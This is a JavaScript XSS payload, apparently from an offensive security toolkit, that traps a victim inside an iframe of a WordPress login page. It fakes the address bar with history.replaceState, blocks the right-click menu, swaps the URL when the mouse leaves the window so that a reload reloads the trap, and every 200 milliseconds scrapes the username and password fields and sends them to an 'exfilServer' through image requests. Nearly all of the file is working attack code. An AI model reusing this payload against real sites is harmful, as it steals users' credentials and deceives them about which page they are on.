let mouseTrackingUrlSwitching = true; // less stealthy, but can protect against reloads


// User's reloading the page will escape the iframe trap
// Disable context menu to make it slightly less convenient for
// users to reload
let disableContextMenu = true; // less stealthy, but can protect against reloads


// Ue fullscreen for actual prod usage
// not fullscreen shows the XSS laden landing
// page in the background so you can 
// tell if you're still where you need to be during
// development. 
let fullscreenIframe = false; // Set to true for production use, false for dev


// What page in the application to start users in
// Note that if the trap is loading from
// a reload, it hopefully will automatically
// load the page the user was on in the iframe
// when they reloaded the page. Otherwise,
// they'll start here
let startingPage = "https://192.168.78.157/wp-login.php";


// Where to send the creds
let exfilServer = "http://localhost";


// With timed updates, we need to be able
// to freeze URL updates if mouse tracking
let freezeUrlUpdating = false;



// Helpful variables
let trapLandingPage = "";
let savedFakePage   = "";
let username        = "";
let password        = "";





// Snag the path of the iframe, and fake it in the browser
// address bar. It'll look like they're surfing the site
// Note: if the user refreshes the page, the gig is up
// and your XSS will stop executing. But as long as they
// keep clicking around, you keep control and you XSS 
// keeps running
// Scrap the creds too
function update()
{
	if (!freezeUrlUpdating)
	{
		var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
	//console.log("Fake url is: " + fakeUrl);
		window.history.replaceState(null, '', fakeUrl);
	}

	// Context menu has a reload button, let's just
	// block the user from that to be a jerk. 
	if (disableContextMenu)
	{
		// This disables the right click context menu in the iframe
		// Has to be continually reset as the iframe changes. 
		var myIframe = document.getElementById('iframe_a');
		var iframeDoc = myIframe.contentWindow.document;
		iframeDoc.addEventListener("contextmenu", e => e.preventDefault());
	}


	// Let's go looking for input fields..
	var inputs, index;

	inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
	for (index = 0; index < inputs.length; index++)
	{
		if (inputs[index].id == 'user_login')
		{
			//console.log("Username Value: " + inputs[index].value);

			// Check if it's changed from last time we scraped
			if (username != inputs[index].value)
			{
				username = inputs[index].value;
				console.log ("++ New username value: " + username);

				// Exfil it
				var fakeImageName = new Image();
				fakeImageName.onload = function()
				{
					image.src = this.src;
				};
				fakeImageName.src = exfilServer + "/username/" + username + ".jpg";
			}
		}

		if (inputs[index].id == 'user_pass')
		{
			//console.log("Password Value: " + inputs[index].value);
			
			// Check if it's changed from last time we scraped
			if (password != inputs[index].value)
			{
				password = inputs[index].value;
				console.log ("++ New password value: " + password);

				// Exfil it
				var fakeImageName = new Image();
				fakeImageName.onload = function()
				{
					image.src = this.src;
				};
				fakeImageName.src = exfilServer + "/password/" + password + ".jpg";

			}
		}
	}
}



// Wut woh, mouse left window
// Are they going to refresh and clobber
// our trap?
function mouseLeft()
{
	// Stop the automatic URL updating
	freezeUrlUpdating = true;


	// DANGER WILL ROBINSON!!!!
	// Is the user about to reload the page? 
	// Take action!
	// We'll put the URL bar back to the actual location
	// with our XSS landing page. So if they reload
	// they'll reload the trap, not the page
	// they think they're on.
	// FINGERS CROSSED that they don't notice....
	console.log("LOST MOUSE");
	savedFakePage = document.getElementById("iframe_a").contentDocument.location.pathname;

	// Ok, switch URL to our real XSS landing page, not where the user "thinks" they are
	window.history.replaceState(null, '', trapLandingPage);


	// Ok, if our page gets reloaded, we'll lose
	// our JavaScript. Let's save what page
	// the user thought they were on in
	// session storage, and we'll try to
	// bootstrap to that location if the 
	// trap reloads. 
	console.log("About to save startup page...");
	sessionStorage.setItem("iframeStartup", savedFakePage);
	console.log("Storage saved page is: " + sessionStorage.getItem('iframeStartup'));
}




// User's mouse is back in the page
function mouseReturned()
{
	// Ok, false alarm. Gained focus back, let's put 
	// our fake URL back up there. 
	console.log("GAINED MOUSE");
	window.history.replaceState(null, '', savedFakePage);

	// Resume the automatic URL updating
	freezeUrlUpdating = false;

	// Let's cleanup any session storage we
	// used
	sessionStorage.removeItem("iframeStartup");
}






// Keep the user on the page with the XSS, but put
// the real website in a fullscreen iframe
// We'll fake the website path using the updateUrl function
function takeOver()
{
	// Save our current XSS landing page location
	// Could come in handy later
	trapLandingPage = window.location.pathname;
	console.log("++ Saving landing page: " + trapLandingPage);

	let iframeStartingPage = "";
	console.log("Storage saved page is: " + sessionStorage.getItem('iframeStartup'));
	savedIframePage = sessionStorage.getItem('iframeStartup');
	console.log("++ On startup, iframe saved page is: " + savedIframePage);
	if (savedIframePage != null)
	{
		console.log("Looks like we have a saved page, let's use it...");
		iframeStartingPage = savedIframePage;
		sessionStorage.removeItem("iframeStartup");
	}
	else
	{
		console.log("Using default iframe starting page...");
		iframeStartingPage = startingPage;
	}

	document.body.style.backgroundColor = "pink";

	// Setup our iframe trap
	var iframe = document.createElement("iframe");
	iframe.setAttribute("src", iframeStartingPage);

	if (fullscreenIframe)
	{
		console.log("&& Using fullscreen");
		iframe.style.width  = "100%";
		iframe.style.height = "100%";
		iframe.style.top = "0px";
		iframe.style.left = "0px"
	}
	else
	{
		console.log("&& Using partial screen");
		iframe.style.width  = "80%";
		iframe.style.height = "80%";
		iframe.style.top = "50px";
		iframe.style.left = "50px";
	}
	iframe.style.position = "fixed";
	iframe.id = "iframe_a";
	document.body.appendChild(iframe);


	// Only hook mouse events if we're 
	// going to try to prevent reloads from 
	// escaping the iframe trap
	if (mouseTrackingUrlSwitching)
	{
		// We need to prepare for a possible page refresh
		// if the user's mouse leaves the window 
		// Perhaps they're going to mash the refresh button
		document.body.addEventListener("mouseleave", function()
		{
			mouseLeft();
		});

		// If the mouse comes back, we need to undo some
		// of our preparations for a refresh (fake the URL again)
		document.body.addEventListener("mouseenter", function()
		{
			mouseReturned();
		});
	}


	// Note that the right click context menu
	// disabling is handled in updateUrl();
}



// Trap all the things
takeOver();



// Use an update timer to update fake URL and 
// scrape the credential input fields
setInterval(function(){ update(); }, 200);